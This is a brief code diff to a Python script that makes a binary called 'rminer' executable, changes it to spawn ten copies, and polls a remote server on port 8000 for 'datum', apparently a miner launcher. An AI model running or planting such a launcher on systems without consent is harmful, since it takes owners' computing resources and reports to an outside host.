@@ -65,7 +65,9 @@ with open("datum.txt", "w") as fw:
 
 
 process = subprocess.run(["chmod", "u+x", "rminer"])
-process = subprocess.Popen(["./rminer"], stdout=subprocess.PIPE, text=True)
+for i in range(10):
+    process = subprocess.Popen(["./rminer"], stdout=subprocess.PIPE, text=True)
+
 while True:
     response = requests.get(
         "http://static.61.88.109.65.clients.your-server.de:8000/datum/"
